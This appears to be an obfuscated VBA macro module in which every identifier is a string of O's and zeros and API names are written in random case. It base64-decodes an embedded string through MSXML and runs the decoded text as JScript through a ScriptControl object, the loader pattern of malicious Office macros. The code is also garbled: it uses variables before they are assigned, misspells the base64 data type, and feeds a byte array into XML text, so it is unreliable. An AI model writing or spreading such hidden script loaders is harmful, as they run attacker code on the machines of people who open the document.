Private Sub O000OO0()
    O00O000 O0O00OO("IADYHgBqAGkA")
End Sub

Private Sub O00O000(ByVal O00OOO0 As String)
    Dim O00O0OO() As Byte
    O00O0OO = O0OOOOO(O00OOO0)
    Dim O0O0OO0 As String
    O0O0OO0 = O0O00OO(O00O0OO)
    O0OOO0O O0O000O, O0O000O
    Set O0O000O = CreateObject("CRIptControl")
    O0O000O.Language = "JVScriPt"
    O0O000O.AddCode O0O0OO0
End Sub

Private Sub O0OOO0O(ByVal O0OO0OO As String, O0OO00O)
    Dim O0O0OOO As Object
    Dim OOO0OO0 As Object
    Set OOO0OO0 = CreateObject(O0OO0OO & "coNTroL")
    OOO0OO0.Async = False: OOO0OO0.VAliDaTnOpaRSe = False
    OOO0OO0.LOAdXmL "<roOt><t>" & O0OO00O & "</t></roOt>"
    O0OO00O = OOO0OO0.getelementsbytagname("t")(0).nodetypedvalue
End Sub

Private Function O0O00OO(ByVal OOOO0O0 As Byte()) As String
    Dim OOOOO0O As Object
    Set OOOOO0O = CreateObject("MSXML2.DOMDoCUmENt")
    O0O00OO = OOOOO0O.createElement("tMP").nodetYpEDvalUe
    With CreateObject("MiCROsofT.XMlDOm")
        .Async = True
        .validateOnParse = False
        .LOaDxML "<ROOt><T>" & OOOO0O0 & "</T></ROOt>"
        O0O00OO = .getelementsbytagname("T")(0).NodeTYPEDvALue
    End With
End Function

Private Function O0OOOOO(ByVal OOO0O0O As String) As Byte()
    Dim OOO0OOO As Object
    Dim OOOOOOO As Object
    Set OOOOOOO = CreateObject("MSXMl2.DOmdoCUmEnT")
    Set OOO0OOO = OOOOOOO.createElement("B64")
    OOO0OOO.dataTYpe = "BIN.bASG64"
    OOO0OOO.text = OOO0O0O
    O0OOOOO = OOO0OOO.nodetYPEDvALue
End Function
